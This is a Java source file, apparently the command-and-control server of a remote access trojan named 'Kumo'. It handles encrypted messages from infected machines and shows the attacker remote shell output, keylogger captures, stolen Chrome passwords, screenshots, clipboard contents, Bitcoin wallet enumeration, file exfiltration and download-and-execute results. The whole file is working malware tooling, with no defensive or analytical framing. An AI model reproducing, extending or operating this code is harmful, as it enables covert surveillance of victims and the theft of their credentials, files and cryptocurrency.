package server;

import gui.Controller;
import gui.components.FileContextMenu;
import gui.views.*;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import logger.Level;
import logger.Logger;
import server.data.CryptoUtils;
import server.data.PseudoBase;
import server.data.Repository;

import java.io.*;

class ProcessCommands implements Repository {

    /* Listens & executes commands received from clients */
    static void processCommands(InputStream is, ClientObject client) throws IOException {
        DataInputStream dis = new DataInputStream(is);
        final Stage[] fileExplorer = {null};
        while (true) {
            String input;
            try {
                input = readFromDis(dis);
            } catch (EOFException e) {
                Logger.log(Level.ERROR, e.toString(), e);
                break;
            }
            /* Reads back the output from a remote execution */
            if (input.contains("CMD")) {
                int outputCount = Integer.parseInt(readFromDis(dis));
                Logger.log(Level.INFO, "CMD length: " + outputCount);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < outputCount; i++) {
                    sb.append(readFromDis(dis)).append("\n");
                }
                SendCommandView.getConsole().appendText(sb.toString());
                /* Sends back the System OS to kumo */
            } else if (input.contains("SYS")) {
                // OS::domain\\uname
                String raw = readFromDis(dis);
                Logger.log(Level.INFO, "Raw SYS command return: " + raw);
                String[] split = raw.split("::");
                String SYSTEMOS = split[0];
                String uname = split[1];
                client.setSYSTEM_OS(SYSTEMOS);
                client.setUname(uname);
                Logger.log(Level.GOOD, "New client! " + client.getIP() + " :: " + client.getNickName() + " :: " + client.getSYSTEM_OS());

                /* Goes up a directory in the file explorer (returns files) */
            } else if (input.contains("DIRECTORYUP")) {
                client.clientCommunicate("FILELIST");
                /* Changes directory to selected one in file explorer (returns files) */
            } else if (input.contains("CHNGDIR")) {
                client.clientCommunicate("FILELIST");
                /* Gets list of files in current directory in file explorer */
            } else if (input.contains("SLEEP")){
                client.setOnlineStatus("Online");
                Controller.updateStats();
                Controller.updateTable();
            } else if (input.equals("READKEYLOG")){
                int len = dis.readInt();
                String content = readFromDis(dis);
                KeyloggerView.getData().setText(content);
            } else if (input.contains("CHROMEPASS")){
                //StringBuilder fullContent = new StringBuilder();
                Logger.log(Level.INFO, "Got valid results from browseer credential gather!");
                try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
                ChromePassView.getResultsArea().appendText("Credentials will show up here.\n\n");
                while (true) {
                    String content = readFromDis(dis);

                    if (content.trim().equals("ENDCHROME")) {
                        break;
                    }
                    try{
                        Thread.sleep(35); // DO NOT REMOVE
                    } catch (InterruptedException e){
                        e.printStackTrace();
                    }

                    ChromePassView.getResultsArea().appendText(content);
                }

            } else if (input.contains("SCREENSHOT")) {
                // SERVER: SCREENSHOT
                // CLIENT: filename
                // CLIENT: fbytes
                String fname = readFromDis(dis);
                String saveDirectory = FileContextMenu.selectedDirectory;
                long fileLength = dis.readLong();
                File downloadedFile = new File(saveDirectory + fname);
                Logger.log(Level.INFO, "Saving screenshot to " + saveDirectory + fname);
                FileOutputStream fos = new FileOutputStream(downloadedFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos);
                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                bos.close();
                fos.close();
                Logger.log(Level.INFO, "Screenshot saved to " + saveDirectory + fname);
            } else if (input.contains("FILELIST")) {
                String pathName = readFromDis(dis);
                int filesCount = dis.readInt();
                String[] fileNames = new String[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    fileNames[i] = readFromDis(dis);
                }
                Platform.runLater(() -> {
                    if (fileExplorer[0] == null) {
                        fileExplorer[0] = new Stage();
                        fileExplorer[0].setMinWidth(400);
                        fileExplorer[0].setMinHeight(400);
                        fileExplorer[0].initStyle(StageStyle.UNDECORATED);
                        fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                        fileExplorer[0].show();
                    }
                    fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                });
                /* Receives data from download request in file explorer */
            } else if (input.contains("DOWNLOAD")) {
                String saveDirectory = FileContextMenu.selectedDirectory;
                long fileLength = dis.readLong();
                String fileName = readFromDis(dis);
                Logger.log(Level.INFO, "Downloading file " + fileName + " from client " + client.getNickName());
                File downloadedFile = new File(saveDirectory + "/" + fileName);
                FileOutputStream fos = new FileOutputStream(downloadedFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos);
                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                bos.close();
                fos.close();
            }
            /* Uninstall and close remote server - remove from Kumo */
            else if (input.contains("EXIT")) {
                PseudoBase.getKumoData().remove(client.getIP());
                CONNECTIONS.remove(client.getIP());
                Controller.updateStats();
                Controller.updateTable();
                client.getClient().close();
                break;
            } else if (input.contains("SYINFO")){
                String data = readFromDis(dis);
                Logger.log(Level.INFO, "SYSINFO results: \n" + data);
                SysInfoView.getArea().appendText(data);
            } else if (input.contains("BEACON")) {
                client.setOnlineStatus("Online");
            } else if (input.contains("DAE")){
                int status = Integer.parseInt(readFromDis(dis));
                Logger.log(Level.INFO, "DOWNLOAD AND EXECUTE STATUS: " + status);
                if (status == 0){
                    DownloadAndExecuteView.setStatusLabelColor("red");
                    DownloadAndExecuteView.setStatusLabel("Failed to execute");
                } else {
                    DownloadAndExecuteView.setStatusLabelColor("green");
                    DownloadAndExecuteView.setStatusLabel("Execution successful");
                }

            } else if (input.contains("PLUGOUT")){
                String output = readFromDis(dis);
                PluginView.getData().setText(output);
            }

            /** clipboard stuff **/
            else if (input.contains("CLIPGET")){
                GetClipboardView.getData().appendText("Clipboard data: \n\n" + readFromDis(dis));
            }

            else if (input.contains("ENUM//BTC")){
                String data = readFromDis(dis);
                Logger.log(Level.INFO, "Enum BTC wallet returned: " + data);
                MiscTextView.getData().setText(data);
            }
        }
    }

    private static String readFromDis(DataInputStream dis) throws IOException {
        return CryptoUtils.decrypt(dis.readUTF(), KumoSettings.AES_KEY);
    }

    private static Long readLongFromDisNoEnc(DataInputStream dis) throws IOException{
        return dis.readLong();
    }
}
